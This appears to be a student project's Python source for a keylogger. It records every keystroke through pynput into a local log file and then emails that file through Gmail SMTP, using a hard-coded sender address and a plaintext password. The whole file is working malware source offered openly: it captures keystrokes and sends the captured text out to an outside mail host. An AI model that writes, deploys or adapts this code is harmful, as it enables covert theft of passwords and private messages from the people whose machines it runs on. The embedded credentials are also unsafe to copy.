'''
Author : Anshul Soni
Project Name : Keylogger
Date Created : 27/02/2022
'''



import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
from pynput.keyboard import Key,Listener

fromaddr = "keylogger.project.cscult@gmail.com"
toaddr = "keylogger.project.cscult@gmail.com"
keys_information = "log.txt"
file_path = "E:\\Divs program\\Keylogger"
extend = "\\"

count = 0
keys = []

def on_press(key):
    global keys, count
    print(key)
    keys.append(key)
    count += 1

    if count >= 1:
        count = 0
        write_file(keys)
        keys = []

def write_file(keys):
    with open(file_path + extend + keys_information, "a") as f:
        for key in keys:
            k = str(key).replace("'","")
            if k.find("space") > 0:
                f.write('\n')
                f.close()
            elif k.find("Key") == -1:
                f.write(k)
                f.close()


def on_release(key):
    if key == Key.esc:
        return False

with Listener(on_press= on_press, on_release=on_release)as Listener:
    Listener.join()

def send_email():
    msg = MIMEMultipart()
    msg['From'] = fromaddr
    msg['To'] = toaddr
    msg['Subject'] = "Log File"

    body = "Hello Everyone! This is the log file pf keylogger"

    msg.attach(MIMEText(body, 'plain'))
    filename = "log.txt"
    attachment = open("E:\\Divs program\\Keylogger\\log.txt", "rb")

    p = MIMEBase('application','octet-stream')
    p.set_payload((attachment).read())
    encoders.encode_base64(p)
    p.add_header('Content-Disposition', 'attachment; filename= %s'% filename)
    msg.attach(p)

    s = smtplib.SMTP('smtp.gmail.com',587)
    s.starttls()
    s.login(fromaddr, "Keylogger")

    text = msg.as_string()
    s.sendmail(fromaddr , toaddr , text)
    s.quit()

send_email()
